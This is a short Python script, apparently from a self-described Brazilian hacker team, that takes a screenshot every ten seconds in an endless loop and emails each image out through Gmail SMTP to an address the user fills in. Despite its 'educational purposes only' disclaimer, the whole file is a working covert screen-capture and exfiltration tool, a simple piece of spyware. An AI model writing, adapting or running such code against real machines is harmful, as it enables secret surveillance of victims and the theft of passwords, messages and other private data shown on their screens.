#AVISO O PRESENTE PROGRAMA FOI DESENVOLVIDO PARA FINS EDUCACIONAIS APENAS! NAO INCENTIVO O USO PARA PREJUDICAR TERCEIROS OU COMETER ATOS ILICITOS
#DISCLAMER DO NOT USE THIS PROGRAM FOR MALICIOUS PURPOSES, THIS MADE MADE FOR EDUCATIONAL PURPOSES ONLY
#CODEDBY : gr3yhat
#Programado por: gr3hat
#Black Dragon Hacker Team Brazil - Somos aqueles que tudo veem, mas não podem ser vistos!

import time
import smtplib
import imghdr
from email.message import EmailMessage

#Some important libs bruv
import pyautogui

while(1):

    def send_email():

        Sender_Email = ""  #<------------------ provide your email - bota teu email ai jovem
        Reciever_Email = "" #<------------------ provide your email - bota teu email ai jovem
        Password = "" #<-------------- provide you password, bota tua senha ai
        newMessage = EmailMessage()
        newMessage['Subject'] = "Screenshot"
        newMessage['From'] = Sender_Email
        newMessage['To'] = Reciever_Email
        newMessage.set_content('Screenshot')

        with open('screen.png', 'rb') as f:
            image_data = f.read()
            image_type = imghdr.what(f.name)
            image_name = f.name
        newMessage.add_attachment(image_data, maintype='image', subtype=image_type, filename=image_name)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(Sender_Email, Password)
            smtp.send_message(newMessage)

    #taking screenshots

    screenshot = pyautogui.screenshot()
    screenshot.save('screen.png')

    time.sleep(10) #taking screenshot every 10 seconds : tira screenshots a cada 10s, mas se quiser aumentar isso...

    #send the email
    send_email()
